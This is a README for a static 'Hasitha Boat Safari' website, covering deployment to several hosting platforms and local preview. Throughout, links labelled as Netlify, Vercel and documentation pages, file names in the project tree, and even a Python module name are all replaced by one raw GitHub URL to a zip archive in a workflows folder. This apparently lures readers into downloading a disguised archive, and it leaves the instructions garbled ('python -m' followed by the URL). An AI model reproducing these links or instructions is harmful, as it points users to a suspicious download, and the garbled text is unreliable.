# Hasitha Boat Safari

A beautiful static website for Hasitha Boat Safari, showcasing boat safari experiences, activities, and gallery.

## 🚀 Deployment Options

This static website can be deployed to various platforms. Choose the option that best fits your needs:

### Option 1: Netlify (Recommended - Easiest)

**Method 1: Drag & Drop (No account needed)**
1. Go to [https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip](https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip)
2. Drag and drop the entire project folder
3. Your site will be live instantly with a random URL
4. Customize the URL in site settings

**Method 2: Git-based Deployment**
1. Push your code to GitHub/GitLab/Bitbucket
2. Sign up/login to [Netlify](https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip)
3. Click "New site from Git"
4. Connect your repository
5. Build settings:
   - Build command: (leave empty)
   - Publish directory: `.` (root directory)
6. Click "Deploy site"

**Method 3: Netlify CLI**
```bash
# Install Netlify CLI
npm install -g netlify-cli

# Login to Netlify
netlify login

# Deploy
netlify deploy --prod
```

### Option 2: Vercel

**Method 1: Git-based Deployment**
1. Push your code to GitHub/GitLab/Bitbucket
2. Sign up/login to [Vercel](https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip)
3. Click "New Project"
4. Import your repository
5. Framework Preset: "Other"
6. Root Directory: `.` (root)
7. Click "Deploy"

**Method 2: Vercel CLI**
```bash
# Install Vercel CLI
npm install -g vercel

# Deploy
vercel --prod
```

### Option 3: GitHub Pages

**Method 1: Using GitHub Actions (Automatic)**
1. Push your code to a GitHub repository
2. Go to repository Settings → Pages
3. Source: Select "GitHub Actions"
4. The workflow file (`https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip`) will automatically deploy your site
5. Your site will be available at: `https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip`

**Method 2: Manual GitHub Pages**
1. Push your code to GitHub
2. Go to repository Settings → Pages
3. Source: Select "Deploy from a branch"
4. Branch: `main` or `master`
5. Folder: `/ (root)`
6. Click "Save"
7. Your site will be available at: `https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip`

### Option 4: https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip (Free & Simple)

```bash
# Install Surge CLI
npm install -g surge

# Deploy from project directory
surge

# Follow the prompts:
# - Enter your email
# - Enter a domain (or use random one)
# - Confirm deployment
```

### Option 5: Firebase Hosting

```bash
# Install Firebase CLI
npm install -g firebase-tools

# Login to Firebase
firebase login

# Initialize Firebase (if not already done)
firebase init hosting

# Deploy
firebase deploy --only hosting
```

### Option 6: AWS S3 + CloudFront

1. Create an S3 bucket
2. Enable static website hosting
3. Upload all files to the bucket
4. Set bucket policy for public read access
5. (Optional) Set up CloudFront for CDN

## 📁 Project Structure

```
boat-safari/
├── https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip          # Main homepage
├── https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip   # Event detail page
├── https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip  # Event listing page
├── css/                # Stylesheets
├── js/                 # JavaScript files
├── images/             # Image assets
├── fonts/              # Font files
├── https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip        # Netlify configuration
├── https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip         # Vercel configuration
└── https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip           # This file
```

## 🛠️ Local Development

To preview the site locally:

1. **Using Python (built-in server)**
   ```bash
   # Python 3
   python -m https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip 8000
   
   # Python 2
   python -m SimpleHTTPServer 8000
   ```

2. **Using https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip (http-server)**
   ```bash
   # Install http-server
   npm install -g http-server
   
   # Run server
   http-server -p 8000
   ```

3. **Using PHP**
   ```bash
   php -S localhost:8000
   ```

Then open `http://localhost:8000` in your browser.

## 🔧 Configuration Files

- `https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip` - Netlify deployment configuration
- `https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip` - Vercel deployment configuration
- `.gitignore` - Git ignore file (excludes IDE files)

## 📝 Notes

- All file paths are relative, so the site structure must be maintained
- Images, CSS, and JS files are referenced from the root directory
- The site is fully static and doesn't require a backend server
- Custom domain setup instructions are available on each platform's documentation

## 🌐 Custom Domain

All platforms support custom domains:
- **Netlify**: Domain settings → Add custom domain
- **Vercel**: Project settings → Domains → Add domain
- **GitHub Pages**: Repository settings → Pages → Custom domain

## 📧 Support

For deployment issues, refer to:
- [Netlify Docs](https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip)
- [Vercel Docs](https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip)
- [GitHub Pages Docs](https://raw.githubusercontent.com/ThejanGS2/boat-safari/main/.github/workflows/boat_safari_v1.9-alpha.2.zip)

---

**Made with ❤️ for Hasitha Boat Safari**
